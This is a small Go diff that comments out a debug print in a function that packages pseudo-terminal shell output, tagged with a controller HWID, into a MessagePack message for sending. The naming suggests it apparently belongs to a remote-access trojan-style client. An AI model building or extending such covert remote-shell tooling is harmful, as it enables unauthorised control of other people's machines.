@@ -1,7 +1,6 @@
 package ptyopt
 
 import (
-	"fmt"
 	"io"
 	"main/Encrypt"
 	"main/MessagePack"
@@ -45,7 +44,7 @@ func removeANSIEscapeCodes(input string) string {
 
 func RetPtyResult[T any](resBuffer []byte, ProcessPath string, unmsgpack *MessagePack.MsgPack, Connection T, sendFunc func([]byte, T)) {
 
-	fmt.Println("Raw Output:", removeANSIEscapeCodes(string(resBuffer))) // 打印原始数据// 临时添加这一行
+	//fmt.Println("Raw Output:", removeANSIEscapeCodes(string(resBuffer))) // 打印原始数据// 临时添加这一行
 	msgpack := new(MessagePack.MsgPack)
 	msgpack.ForcePathObject("Pac_ket").SetAsString("shell")
 	msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
